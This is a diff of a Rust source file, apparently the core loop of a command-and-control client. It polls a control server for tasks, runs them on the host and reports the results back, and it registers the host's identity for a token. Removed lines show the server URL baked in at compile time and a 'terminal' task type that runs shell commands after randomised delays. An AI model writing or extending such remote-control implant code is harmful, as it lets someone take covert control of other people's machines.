@@ -2,36 +2,34 @@ use std::{
     thread,
     time,
 };
-//use std::borrow::Borrow;
 use models::Task;
-use rand::Rng;
-
 
 mod communication;
 mod utils;
 mod models;
 mod tasks;
 
-// Note that URL is set by environment variable during compilation
-const URL: &'static str = env!("CONTROL_SERVER_URL");
 const POLL_SLEEP: time::Duration = time::Duration::from_secs(5);
-const TERMINAL_CMD: &'static str = "terminal";
 
 
 /// Fetches commands from the control server and runs them
 async fn call_home(token: &String) {
-    let tasks: Vec<Task> = match communication::get_commands(token, URL).await {
+    let tasks: Vec<Task> = match communication::get_commands(token).await {
         Ok(val) => val,
         Err(_) => Vec::new(),
     };
     for t in tasks {
-        let wait = rand::thread_rng().gen_range(t.min_delay, t.max_delay);
-        thread::sleep(time::Duration::from_millis(wait as u64));
-
-        // Add more command types here when supported by server and implemented in client
-        if t.name == TERMINAL_CMD {
-            tasks::terminal_command(t.data);
-        }
+        let tr = tasks::run_task(t);
+        match communication::send_task_result(tr, token).await {
+            Ok(_) => {
+                #[cfg(debug_assertions)]
+                println!("Successfully sent task result to server");
+            }
+            Err(_) => {
+                #[cfg(debug_assertions)]
+                println!("Failed send task result to server!");
+            }
+        };
     }
 }
 
@@ -44,7 +42,7 @@ async fn initialise_client() -> String {
     let mut token: String;
     loop {
         let id = utils::get_host_identify();
-        token = match communication::send_identity(id, URL).await {
+        token = match communication::send_identity(id).await {
             Ok(val) => val,
             Err(_) => String::from("")
         };
